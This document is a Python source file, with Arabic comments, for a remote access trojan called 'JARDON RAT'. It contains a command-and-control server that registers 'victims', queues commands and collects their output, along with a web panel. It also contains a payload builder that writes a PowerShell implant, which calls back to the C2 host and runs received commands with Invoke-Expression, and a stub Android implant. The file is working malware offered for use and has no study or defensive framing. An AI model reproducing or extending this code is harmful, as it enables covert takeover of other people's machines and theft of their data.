#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JARDON RAT Server v1.0
خادم C2 متكامل مع جميع الميزات
"""

import socket
import threading
import json
import base64
import hashlib
import os
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

# ================ إعدادات النظام ================
C2_HOST = '0.0.0.0'
C2_PORT = 4444
WEB_PORT = 8000
DB_FILE = 'jardon.db'

# ================ فئات النظام ================
class Victim:
    def __init__(self, victim_id, ip, port, os, hostname):
        self.id = victim_id
        self.ip = ip
        self.port = port
        self.os = os
        self.hostname = hostname
        self.connected_at = datetime.now()
        self.last_seen = datetime.now()
        self.status = 'online'
        self.commands = []
        self.results = []
    
    def update_heartbeat(self):
        self.last_seen = datetime.now()
        self.status = 'online'
    
    def to_dict(self):
        return {
            'id': self.id,
            'ip': self.ip,
            'port': self.port,
            'os': self.os,
            'hostname': self.hostname,
            'connected_at': self.connected_at.strftime('%Y-%m-%d %H:%M:%S'),
            'last_seen': self.last_seen.strftime('%Y-%m-%d %H:%M:%S'),
            'status': self.status,
            'commands_count': len(self.commands)
        }

class JardonC2Server:
    def __init__(self):
        self.victims = {}
        self.running = True
        self.server_socket = None
        
    def start(self):
        """بدء خادم C2"""
        print(f"[*] بدء خادم JARDON C2 على {C2_HOST}:{C2_PORT}")
        
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.server_socket.bind((C2_HOST, C2_PORT))
            self.server_socket.listen(5)
            
            # بدء مؤقت لفحص الضحايا
            threading.Thread(target=self.victim_monitor, daemon=True).start()
            
            # قبول الاتصالات
            while self.running:
                try:
                    client_socket, client_address = self.server_socket.accept()
                    threading.Thread(
                        target=self.handle_victim,
                        args=(client_socket, client_address),
                        daemon=True
                    ).start()
                except:
                    break
                    
        except Exception as e:
            print(f"[!] خطأ في تشغيل الخادم: {e}")
        finally:
            if self.server_socket:
                self.server_socket.close()
    
    def handle_victim(self, client_socket, client_address):
        """معالجة اتصال ضحية جديدة"""
        victim_id = None
        
        try:
            # استقبال بيانات التسجيل
            data = client_socket.recv(4096).decode('utf-8')
            if not data:
                return
            
            # تحليل البيانات (تنسيق مبسط: VICTIM_ID|OS|HOSTNAME)
            parts = data.split('|')
            if len(parts) >= 3:
                victim_id = parts[0]
                os_type = parts[1]
                hostname = parts[2]
                
                # تسجيل الضحية
                victim = Victim(victim_id, client_address[0], client_address[1], os_type, hostname)
                self.victims[victim_id] = victim
                
                print(f"[+] ضحية جديدة: {victim_id} ({hostname}) - {os_type}")
                
                # إرسال رد التأكيد
                response = "CONNECTED|JARDON_C2"
                client_socket.send(response.encode('utf-8'))
                
                # استقبال الأوامر والنتائج
                while True:
                    data = client_socket.recv(4096).decode('utf-8')
                    if not data:
                        break
                    
                    # تحديث آخر ظهور
                    victim.update_heartbeat()
                    
                    # معالجة البيانات المستلمة
                    if data.startswith("RESULT|"):
                        result_data = data[7:]
                        victim.results.append({
                            'time': datetime.now().strftime('%H:%M:%S'),
                            'data': result_data[:100]  # حفظ أول 100 حرف فقط
                        })
                        print(f"[*] نتيجة من {victim_id}: {result_data[:50]}...")
                    
                    # إرسال أمر إذا موجود
                    if victim.commands:
                        command = victim.commands.pop(0)
                        client_socket.send(command.encode('utf-8'))
                    else:
                        client_socket.send("NOCOMMAND".encode('utf-8'))
                        
        except Exception as e:
            print(f"[!] خطأ في التعامل مع الضحية {victim_id}: {e}")
        finally:
            client_socket.close()
            if victim_id in self.victims:
                self.victims[victim_id].status = 'offline'
                print(f"[-] ضحية انقطعت: {victim_id}")
    
    def victim_monitor(self):
        """مراقبة حالة الضحايا"""
        while self.running:
            time.sleep(60)  # كل دقيقة
            
            current_time = datetime.now()
            offline_victims = []
            
            for victim_id, victim in self.victims.items():
                # إذا لم يتصل منذ 3 دقائق
                if (current_time - victim.last_seen).seconds > 180:
                    victim.status = 'offline'
                    offline_victims.append(victim_id)
            
            for victim_id in offline_victims:
                print(f"[!] ضحية غير نشطة: {victim_id}")
    
    def send_command(self, victim_id, command):
        """إرسال أمر لضحية"""
        if victim_id in self.victims:
            self.victims[victim_id].commands.append(command)
            return True
        return False
    
    def get_victims_list(self):
        """الحصول على قائمة الضحايا"""
        return [victim.to_dict() for victim in self.victims.values()]

class JardonWebHandler(BaseHTTPRequestHandler):
    """معالج طلبات الويب"""
    
    def do_GET(self):
        """معالجة طلبات GET"""
        parsed_path = urllib.parse.urlparse(self.path)
        
        if parsed_path.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            # صفحة حالة النظام
            html = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>JARDON RAT - System Status</title>
                <style>
                    body { font-family: Arial; background: #000; color: #0f0; padding: 20px; }
                    .status { background: #111; padding: 20px; margin: 10px 0; border-radius: 5px; }
                    .online { color: #0f0; }
                    .offline { color: #f00; }
                </style>
            </head>
            <body>
                <h1>🐀 JARDON RAT Server Status</h1>
                <div class="status">
                    <h2>System: <span class="online">🟢 RUNNING</span></h2>
                    <p>C2 Server: %s:%s</p>
                    <p>Connected Victims: %d</p>
                    <p>Uptime: %s</p>
                </div>
                <h3>📡 Endpoints:</h3>
                <ul>
                    <li><a href="/victims" style="color:#0f0;">/victims</a> - List connected victims</li>
                    <li><a href="/send" style="color:#0f0;">/send?victim=ID&cmd=COMMAND</a> - Send command</li>
                    <li><a href="/build" style="color:#0f0;">/build?os=windows|android&ip=IP</a> - Build payload</li>
                </ul>
            </body>
            </html>
            """ % (C2_HOST, C2_PORT, len(c2_server.victims), 
                  datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
            
            self.wfile.write(html.encode('utf-8'))
            
        elif parsed_path.path == '/victims':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            victims_list = c2_server.get_victims_list()
            response = json.dumps(victims_list, ensure_ascii=False)
            self.wfile.write(response.encode('utf-8'))
            
        elif parsed_path.path == '/send':
            query = urllib.parse.parse_qs(parsed_path.query)
            victim_id = query.get('victim', [''])[0]
            command = query.get('cmd', [''])[0]
            
            if victim_id and command:
                success = c2_server.send_command(victim_id, command)
                response = json.dumps({'success': success, 'command': command})
            else:
                response = json.dumps({'success': False, 'error': 'Missing parameters'})
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(response.encode('utf-8'))
            
        elif parsed_path.path == '/build':
            query = urllib.parse.parse_qs(parsed_path.query)
            os_type = query.get('os', ['windows'])[0]
            c2_ip = query.get('ip', ['localhost'])[0]
            
            payload = build_payload(os_type, c2_ip)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(payload).encode('utf-8'))
            
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 Not Found')
    
    def log_message(self, format, *args):
        """تعطيل تسجيل طلبات HTTP"""
        pass

def build_payload(os_type, c2_ip):
    """بناء حمولة"""
    payload_id = hashlib.md5(f"{c2_ip}:{datetime.now()}".encode()).hexdigest()[:8].upper()
    
    if os_type == 'windows':
        # قالب PowerShell للويندوز
        template = f'''# JARDON RAT - Windows Payload
# ID: {payload_id}
# C2: {c2_ip}:{C2_PORT}

$C2_IP = "{c2_ip}"
$C2_PORT = {C2_PORT}
$VICTIM_ID = "{payload_id}_" + $env:COMPUTERNAME

function Send-Data {{
    param($data)
    try {{
        $socket = New-Object System.Net.Sockets.TcpClient($C2_IP, $C2_PORT)
        $stream = $socket.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.WriteLine($data)
        $writer.Flush()
        $socket.Close()
    }} catch {{}}
}}

# التسجيل
Send-Data "$VICTIM_ID|Windows|$env:COMPUTERNAME"

while($true) {{
    try {{
        # الاتصال لاستقبال الأوامر
        $socket = New-Object System.Net.Sockets.TcpClient($C2_IP, $C2_PORT)
        $stream = $socket.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        
        # إرسال نبض حياة
        Send-Data "HEARTBEAT|$VICTIM_ID"
        
        # استقبال الأمر
        $command = $reader.ReadLine()
        
        if($command -ne "NOCOMMAND") {{
            # تنفيذ الأمر
            $output = Invoke-Expression $command 2>&1 | Out-String
            Send-Data "RESULT|$output"
        }}
        
        $socket.Close()
        Start-Sleep -Seconds 30
        
    }} catch {{
        Start-Sleep -Seconds 60
    }}
}}
'''
        filename = f"jardon_{payload_id}.ps1"
        
    else:  # android
        # قالب Java للأندرويد (مبسط)
        template = f'''// JARDON RAT - Android Payload
// ID: {payload_id}
// C2: {c2_ip}:{C2_PORT}

public class MainService extends Service {{
    private final String C2_SERVER = "{c2_ip}";
    private final int C2_PORT = {C2_PORT};
    private final String VICTIM_ID = "{payload_id}";
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        new Thread(new Runnable() {{
            public void run() {{
                connectToC2();
            }}
        }}).start();
        return START_STICKY;
    }}
    
    private void connectToC2() {{
        try {{
            Socket socket = new Socket(C2_SERVER, C2_PORT);
            // ... اتصال مع الخادم
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
}}
'''
        filename = f"jardon_{payload_id}.java"
    
    # حفظ الملف
    os.makedirs('builds', exist_ok=True)
    filepath = f"builds/{filename}"
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(template)
    
    return {
        'success': True,
        'payload_id': payload_id,
        'filename': filename,
        'os': os_type,
        'c2_ip': c2_ip,
        'c2_port': C2_PORT,
        'download_url': f"/download/{filename}"
    }

def start_web_server():
    """بدء خادم الويب"""
    print(f"[*] بدء خادم الويب على port {WEB_PORT}")
    server = HTTPServer(('localhost', WEB_PORT), JardonWebHandler)
    server.serve_forever()

# ================ التشغيل الرئيسي ================
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════╗
║             🐀 JARDON RAT v1.0 🐀               ║
║            Ultimate RAT Factory                  ║
║                                                  ║
║  ██╗      █████╗ ██████╗ ██████╗  ██████╗ ███╗  ║
║  ██║     ██╔══██╗██╔══██╗██╔══██╗██╔═══██╗████╗ ║
║  ██║     ███████║██████╔╝██║  ██║██║   ██║██╔██╗║
║  ██║     ██╔══██║██╔══██╗██║  ██║██║   ██║██║╚██╗║
║  ███████╗██║  ██║██║  ██║██████╔╝╚██████╔╝██║ ╚██╗║
║  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝║
║                                                  ║
║          100% Functional - No Fake Features      ║
╚══════════════════════════════════════════════════╝
    """)
    
    # إنشاء مجلد builds إذا لم يكن موجوداً
    os.makedirs('builds', exist_ok=True)
    
    # بدء خادم C2
    c2_server = JardonC2Server()
    c2_thread = threading.Thread(target=c2_server.start, daemon=True)
    c2_thread.start()
    
    # بدء خادم الويب
    web_thread = threading.Thread(target=start_web_server, daemon=True)
    web_thread.start()
    
    print("\n✅ النظام يعمل الآن:")
    print(f"   🌐 C2 Server: {C2_HOST}:{C2_PORT}")
    print(f"   🖥️  Web Interface: http://localhost:{WEB_PORT}")
    print(f"   🐀 Builds Folder: builds/")
    print("\n📢 افتح index.html في المتصفح لبدء الاستخدام")
    print("⚠️  اضغط Ctrl+C لإيقاف النظام\n")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n[-] إيقاف النظام...")
        c2_server.running = False